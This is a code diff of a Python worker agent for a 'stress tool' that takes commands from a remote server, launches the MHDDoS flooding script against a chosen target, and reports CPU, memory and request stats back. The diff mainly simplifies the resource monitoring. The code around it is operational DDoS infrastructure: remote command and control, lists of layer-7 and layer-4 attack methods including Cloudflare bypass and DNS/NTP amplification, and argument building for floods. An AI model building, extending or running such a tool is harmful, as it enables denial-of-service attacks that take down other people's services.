@@ -4,7 +4,7 @@ AcherLab Stress Tool - Worker Agent
 Chay tren VPS, nhan lenh tu Server (Railway), chay MHDDoS, gui stats ve.
 """
 
-import os, sys, json, time, threading, subprocess, platform, re, requests, signal
+import os, sys, json, time, threading, subprocess, re, requests
 from datetime import datetime
 
 SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:5000")
@@ -14,52 +14,36 @@ MHDDOS_DIR = os.environ.get("MHDDOS_DIR", os.path.join(os.path.dirname(__file__)
 
 attack_process = None
 attack_start_time = None
-stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00", "cpu_per_core": [], "cpu_info": None}
+stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00", "cpu_info": None}
 logs = []
-prev_cpu = None
+prev_idle = 0
+prev_total = 0
 
-def get_cpu_per_core():
+def get_cpu_pct():
+    global prev_idle, prev_total
     try:
         with open("/proc/stat") as f:
-            lines = f.readlines()
-        result = []
-        for line in lines:
-            if line.startswith("cpu") and line[3].isdigit():
-                parts = line.split()
-                core_id = parts[0][3:]
-                user = int(parts[1]); nice = int(parts[2]); sys = int(parts[3]); idle = int(parts[4])
-                result.append({"core": core_id, "total": user + nice + sys + idle, "idle": idle})
-        return result
+            line = f.readline()
+        parts = line.split()
+        idle = int(parts[4])
+        total = sum(int(p) for p in parts[1:])
+        if prev_total:
+            dt = total - prev_total
+            di = idle - prev_idle
+            pct = round((1 - di / max(dt, 1)) * 100, 1)
+        else:
+            pct = 0
+        prev_idle, prev_total = idle, total
+        return pct
     except:
-        return []
+        return 0
 
-def get_cpu_usage():
-    global prev_cpu
-    cur = get_cpu_per_core()
-    if not cur:
-        return {"overall": 0, "per_core": []}
-    if prev_cpu:
-        per_core = []
-        for c, p in zip(cur, prev_cpu):
-            dt = c["total"] - p["total"]
-            di = c["idle"] - p["idle"]
-            per_core.append({"core": c["core"], "usage": round((1 - di / max(dt, 1)) * 100, 1) if dt > 0 else 0})
-        overall = round(sum(x["usage"] for x in per_core) / max(len(per_core), 1), 1)
-        prev_cpu = cur
-        return {"overall": overall, "per_core": per_core}
-    prev_cpu = cur
-    return {"overall": 0, "per_core": [{"core": c["core"], "usage": 0} for c in cur]}
-
-def get_system_info():
+def get_mem_pct():
     try:
-        cd = get_cpu_usage()
-        mem = "0"
         r = subprocess.run("free -m | awk 'NR==2{printf \"%.1f\", $3*100/$2}'", shell=True, capture_output=True, text=True, timeout=3)
-        if r.stdout.strip():
-            mem = r.stdout.strip()
-        return {"cpu": cd["overall"], "cpu_per_core": cd["per_core"], "memory": float(mem) if mem else 0}
+        return float(r.stdout.strip()) if r.stdout.strip() else 0
     except:
-        return {"cpu": 0, "cpu_per_core": [], "memory": 0}
+        return 0
 
 def get_cpu_info():
     try:
@@ -110,7 +94,7 @@ def run_attack(cmd):
     rpc = str(cmd.get("rpc", 10))
 
     logs = []
-    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00", "cpu_per_core": [], "cpu_info": None}
+    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00", "cpu_info": None}
     attack_start_time = time.time()
 
     start_py = os.path.join(MHDDOS_DIR, "start.py")
@@ -118,13 +102,13 @@ def run_attack(cmd):
         logs.append(f"[ERROR] MHDDoS not found at {start_py}")
         return {"error": f"MHDDoS not found at {start_py}"}
 
-    layer7_methods = ["GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW","HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE","XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR"]
-    layer4_methods = ["TCP","UDP","SYN","CPS","CONNECTION","VSE","TS3","FIVEM","FIVEM-TOKEN","MINECRAFT","MCBOT","MCPE","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"]
+    layer7 = ["GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW","HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE","XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR"]
+    layer4 = ["TCP","UDP","SYN","CPS","CONNECTION","VSE","TS3","FIVEM","FIVEM-TOKEN","MINECRAFT","MCBOT","MCPE","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"]
 
     proc_args = ["python3", "-u", start_py]
-    if method in layer7_methods:
+    if method in layer7:
         proc_args += [method, target, proxy_type, threads, "http.txt", rpc, duration]
-    elif method in layer4_methods:
+    elif method in layer4:
         from urllib.parse import urlparse
         parsed = urlparse(target)
         host = parsed.hostname or target
@@ -186,20 +170,15 @@ def worker_loop():
                 el = int(time.time() - attack_start_time)
                 uptime = f"{el//3600:02d}:{(el%3600)//60:02d}:{el%60:02d}"
             stats["uptime"] = uptime
-
-            sys_info = get_system_info()
-            stats["cpu"] = sys_info["cpu"]
-            stats["memory"] = sys_info["memory"]
-            stats["cpu_per_core"] = sys_info["cpu_per_core"]
+            stats["cpu"] = get_cpu_pct()
+            stats["memory"] = get_mem_pct()
             stats["cpu_info"] = cpu_info
-
-            recent_logs = logs[-50:] if len(logs) > 0 else []
 
             payload = {
                 "version": "1.0",
                 "cpu_info": cpu_info,
-                "stats": stats,
-                "logs": recent_logs,
+                "stats": dict(stats),
+                "logs": logs[-50:] if logs else [],
             }
             requests.post(f"{SERVER_URL}/api/worker/stats", json=payload, headers=send_headers(), timeout=10)
 
